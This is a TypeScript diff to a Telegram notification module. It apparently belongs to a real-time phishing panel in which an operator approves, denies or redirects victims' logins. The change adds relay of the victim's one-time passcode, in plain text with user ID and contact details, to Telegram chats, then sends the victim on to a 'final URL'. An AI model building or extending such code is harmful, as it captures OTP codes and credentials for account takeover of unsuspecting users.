@@ -4,6 +4,9 @@ const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
   .map((id) => id.trim())
   .filter(Boolean)
 
+export type AdminLoginOutcomeAction = 'approve' | 'deny' | 'redirect'
+export type AdminRequestKind = 'login' | 'otp'
+
 function escapeHtml(s: string): string {
   return s
     .replace(/&/g, '&amp;')
@@ -43,49 +46,53 @@ async function sendTelegramMessage(message: string): Promise<boolean> {
   return results.some(Boolean)
 }
 
-export type AdminLoginOutcomeAction = 'approve' | 'deny' | 'redirect'
+function methodContactLines(method: string | undefined, maskedEmail?: string, maskedPhone?: string): string {
+  const methodLabel = method === 'email' ? 'Email' : 'Text Message (SMS)'
+  const contact =
+    method === 'email'
+      ? `📧 Email: ${asCode(maskedEmail)}`
+      : `📱 Phone: ${asCode(maskedPhone)}`
+  return `📧 Method: ${asCode(methodLabel)}\n${contact}`
+}
 
 export async function sendAdminLoginOutcomeNotification(data: {
   action: AdminLoginOutcomeAction
+  requestKind?: AdminRequestKind
   userId?: string
   method?: 'email' | 'text' | string
   maskedEmail?: string
   maskedPhone?: string
+  code?: string
 }): Promise<boolean> {
-  const methodLabel = data.method === 'email' ? 'Email' : 'Text Message (SMS)'
+  const isOtp = data.requestKind === 'otp'
+  const contact = methodContactLines(data.method, data.maskedEmail, data.maskedPhone)
+  const codeLine = isOtp && data.code ? `\n🔐 Code: ${asCode(data.code)}` : ''
   let message: string
 
   if (data.action === 'approve') {
     message = [
-      `✅ <b>Admin – Login Approved</b>`,
+      isOtp ? `✅ <b>Admin – OTP Approved</b>` : `✅ <b>Admin – Login Approved</b>`,
       '━━━━━━━━━━━━━━━━━━',
       `👤 User ID: ${asCode(data.userId)}`,
-      `📧 Method: ${asCode(methodLabel)}`,
-      data.method === 'email'
-        ? `📧 Email: ${asCode(data.maskedEmail)}`
-        : `📱 Phone: ${asCode(data.maskedPhone)}`,
-      `✅ Status: Approved – User redirected to OTP page`,
+      contact + codeLine,
+      isOtp
+        ? `✅ Status: Approved – User sent to final URL`
+        : `✅ Status: Approved – User redirected to OTP page`,
     ].join('\n')
   } else if (data.action === 'deny') {
     message = [
-      `❌ <b>Admin – Login Denied</b>`,
+      isOtp ? `❌ <b>Admin – OTP Denied</b>` : `❌ <b>Admin – Login Denied</b>`,
       '━━━━━━━━━━━━━━━━━━',
       `👤 User ID: ${asCode(data.userId)}`,
-      `📧 Method: ${asCode(methodLabel)}`,
-      data.method === 'email'
-        ? `📧 Email: ${asCode(data.maskedEmail)}`
-        : `📱 Phone: ${asCode(data.maskedPhone)}`,
+      contact + codeLine,
       `❌ Status: Denied – User shown error message`,
     ].join('\n')
   } else {
     message = [
-      `↪️ <b>Admin – Login Redirected</b>`,
+      isOtp ? `↪️ <b>Admin – OTP Redirected</b>` : `↪️ <b>Admin – Login Redirected</b>`,
       '━━━━━━━━━━━━━━━━━━',
       `👤 User ID: ${asCode(data.userId)}`,
-      `📧 Method: ${asCode(methodLabel)}`,
-      data.method === 'email'
-        ? `📧 Email: ${asCode(data.maskedEmail)}`
-        : `📱 Phone: ${asCode(data.maskedPhone)}`,
+      contact + codeLine,
       `↪️ Status: Redirected – User sent to final URL`,
     ].join('\n')
   }
